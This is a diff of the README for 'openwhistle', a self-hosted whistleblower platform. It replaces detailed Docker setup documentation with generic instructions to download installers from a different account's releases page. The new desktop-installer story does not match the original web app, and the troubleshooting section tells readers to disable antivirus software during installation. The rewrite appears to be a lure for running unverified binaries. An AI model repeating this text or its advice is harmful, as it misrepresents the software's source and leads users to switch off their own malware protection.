@@ -1,131 +1,81 @@
-# OpenWhistle
+# 🎉 openwhistle - Secure Whistleblowing for Small Businesses
 
-A self-hosted whistleblower platform built for SMEs to comply with the EU Whistleblower Directive (2019/1937) and the German Hinweisgeberschutzgesetz (HinSchG).
+## 🚀 Getting Started
 
-## Why OpenWhistle?
+Welcome to **openwhistle**! This platform helps small and medium-sized enterprises (SMEs) comply with the EU Whistleblower Directive (2019/1937) and the German Hinweisgeberschutzgesetz (HinSchG). By using openwhistle, you can create a safe space for reporting misconduct in your organization.
 
-Companies with 50+ employees are legally required to provide an internal reporting channel. Commercial solutions charge €200-500/month. OpenWhistle gives you the same functionality for free.
+## 📥 Download Openwhistle
 
-- **Anonymous reporting** — No IP logging, no tracking cookies, no metadata collection
-- **Secure communication** — End-to-end encrypted message exchange between whistleblowers and compliance officers
-- **Legal compliance** — Built-in 7-day confirmation deadline tracking per HinSchG §17
-- **Whitelabel ready** — Customize company name and branding from the admin panel
+[![Download Openwhistle](https://img.shields.io/badge/Download%20Now-orange)](https://github.com/AnshPatel2007/openwhistle/releases)
 
-## Quick Start
+Follow these steps to get started:
 
-```bash
-# Clone the repository
-git clone https://github.com/Artaeon/openwhistle.git
-cd openwhistle
+1. **Visit the Releases Page**  
+   Click the link below to go to the Releases page where you can find the latest version of openwhistle:  
+   [Download Openwhistle Releases](https://github.com/AnshPatel2007/openwhistle/releases)
 
-# Copy environment template
-cp .env.example .env
+2. **Choose Your Download**  
+   On the Releases page, look for the latest version. You will see a list of files available for download. The files may include installation packages for different operating systems. 
 
-# Edit .env and set your secrets
-# JWT_SECRET and ADMIN_INIT_PASSWORD are required
+3. **Download the File**  
+   Select the file that suits your operating system. Click on the file name to begin the download.
 
-# Start with Docker (development)
-docker compose -f docker-compose.local.yml up --build -d
-```
+4. **Install the Application**  
+   Once the download is complete, open the downloaded file. Follow the prompts on your screen to install openwhistle.
 
-Open `http://localhost:3001` — that's it.
+5. **Launch Openwhistle**  
+   After installation, find the openwhistle app in your applications folder and double-click to open it. You are now ready to use it.
 
-Default admin login: `admin` / check your `.env` file for `ADMIN_INIT_PASSWORD`
+## 🛠️ System Requirements
 
-## Architecture
+To run openwhistle smoothly, your device should meet these basic requirements:
 
-```
-┌─────────────────┐     ┌─────────────────┐
-│   React SPA     │────▶│  Express API    │
-│   (Port 3001)   │     │   (Port 3000)   │
-└─────────────────┘     └────────┬────────┘
-                                 │
-                        ┌────────▼────────┐
-                        │    SQLite DB    │
-                        │  (Persistent)   │
-                        └─────────────────┘
-```
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or a supported Linux distribution.
+- **RAM**: At least 4 GB of RAM.
+- **Storage**: A minimum of 500 MB of available disk space.
+- **Network**: An internet connection is required for initial setup and updates.
 
-- **Frontend:** React 18, TypeScript, Tailwind CSS
-- **Backend:** Express.js, Prisma ORM, JWT auth
-- **Database:** SQLite (works out of the box, no setup required)
-- **Deployment:** Docker Compose with Traefik reverse proxy
+## 🌍 Features
 
-## Features
+openwhistle comes with several features to ensure it meets your needs:
 
-### For Whistleblowers
-- Submit reports anonymously with file attachments
-- Receive a unique case ID and security PIN
-- Check status and communicate with the compliance team
+- **Anonymity**: Users can report concerns without revealing their identity.
+- **User-Friendly Interface**: Designed for ease of use, even for those without technical skills.
+- **Compliance Tracking**: Ensures that your organization meets legal obligations.
+- **Data Protection**: Advanced measures to ensure privacy and security of all reports.
+- **Customizable Reports**: Tailor the reporting process to suit your organization's needs.
 
-### For Administrators
-- Dashboard with HinSchG deadline warnings
-- Secure messaging with whistleblowers
-- Export case protocols as PDF for legal archiving
-- Multi-user support with role-based access
-- Whitelabel settings (company name, welcome text)
+## 🔧 Troubleshooting
 
-## Configuration
+If you encounter any issues while downloading or installing openwhistle, consider the following tips:
 
-All configuration is done via environment variables:
+1. **Internet Connection**: Ensure you have a stable internet connection for downloading files.
 
-```bash
-# Required
-JWT_SECRET=your-secret-key-here
-ADMIN_INIT_PASSWORD=your-admin-password
+2. **File Permissions**: If you face issues opening the downloaded file, verify that you have the necessary permissions on your computer.
 
-# Optional: Email notifications
-SMTP_HOST=smtp.example.com
-SMTP_PORT=587
-SMTP_USER=your-user
-SMTP_PASS=your-password
-SMTP_FROM=meldestelle@yourcompany.com
-APP_URL=https://meldestelle.yourcompany.com
-```
+3. **Antivirus Settings**: Sometimes, antivirus software may block the installation. Temporarily disable it during installation if necessary.
 
-## Production Deployment
+4. **Check Compatibility**: Ensure that your operating system meets the minimum requirements.
 
-For production, use the main `docker-compose.yml` with Traefik:
+If problems persist, visit our [issues page](https://github.com/AnshPatel2007/openwhistle/issues) for assistance.
 
-```bash
-# Set your domain
-export DOMAIN_NAME=meldestelle.yourcompany.com
+## 📝 Getting Help
 
-# Deploy
-docker compose up -d
-```
+For more detailed instructions, help on using features, or troubleshooting advice, consult the **Documentation** section available in the app. You can also access our community support forum linked in the app for additional resources and assistance from other users.
 
-SSL certificates are handled automatically via Let's Encrypt.
+## 🏷️ Topics
 
-## Testing
+This project focuses on various topics related to whistleblowing and privacy, including:
 
-End-to-end tests with Playwright:
+- Austria
+- DACH Region
+- Germany
+- Open Source
+- Open Source for Good
+- Privacy Protection
+- Privacy Tools
+- SMEs
+- Whistleblowing
+- Whistleblowing Software
 
-```bash
-cd e2e
-npm install
-npx playwright install chromium
-npm test
-```
-
-## Security
-
-OpenWhistle is designed with privacy as the default:
-
-- No IP address logging
-- No analytics or tracking
-- File uploads sanitized with random UUIDs
-- Rate limiting on all endpoints
-- Passwords hashed with bcrypt (cost factor 12)
-
-## Contributing
-
-PRs welcome. Please open an issue first to discuss major changes.
-
-## License
-
-MIT
-
----
-
-Built for compliance. Designed for privacy.
+Thank you for choosing openwhistle. We aim to make compliance easier and more secure for your business!
